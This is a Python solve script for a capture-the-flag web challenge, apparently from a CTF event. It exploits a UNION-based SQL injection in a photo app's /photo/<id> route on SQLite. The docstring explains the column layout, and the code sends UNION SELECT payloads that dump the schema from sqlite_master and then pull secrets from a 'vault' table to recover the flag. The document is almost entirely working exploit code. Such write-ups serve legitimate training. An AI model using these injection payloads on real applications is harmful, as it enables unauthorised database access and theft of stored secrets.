#!/usr/bin/env python3
"""
PhotoVault (sqli, 200) — CWE-89 UNION-based SQLi on SQLite.

/photo/<id> injects the id raw into `SELECT id,title,caption,src FROM photos
WHERE id=<input>`. The app swallows SQL errors as 200, and the detail template
renders the first char of a column as a thumbnail (so that column must be a
string, not int/NULL). Column count = 4. Carry data in cols 3/4 (title/caption
-> <h2>/<p>) and keep col 2 a string.

Usage:
    python3 solve.py                          # defaults to sqli3.chal.deti:8032
    python3 solve.py http://sqli3.chal.deti:8032
"""
import re
import sys
import urllib.parse

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://sqli3.chal.deti:8032"
FLAG_RE = re.compile(r"flag\{[^}]*\}")
CARD_RE = re.compile(r'<h2>(.*?)</h2>.*?<p>(.*?)</p>', re.S)


def union(select_cols: str) -> str:
    """Run /photo/99 UNION SELECT <cols> and return the page text."""
    payload = f"99 UNION SELECT {select_cols}"
    url = f"{BASE}/photo/" + urllib.parse.quote(payload)
    return requests.get(url, timeout=10).text


def main() -> int:
    # schema (for the writeup / to confirm table+columns)
    schema = union("1,'x',group_concat(name),group_concat(sql) FROM sqlite_master")
    m = CARD_RE.search(schema)
    if m:
        print(f"[i] tables: {m.group(1)}")

    # flag from vault.secret
    page = union("1,'x',group_concat(item),group_concat(secret) FROM vault")
    flag = FLAG_RE.search(page)
    if flag:
        print(f"[+] FLAG: {flag.group(0)}")
        return 0
    print("[-] no flag found; page:\n", CARD_RE.search(page))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
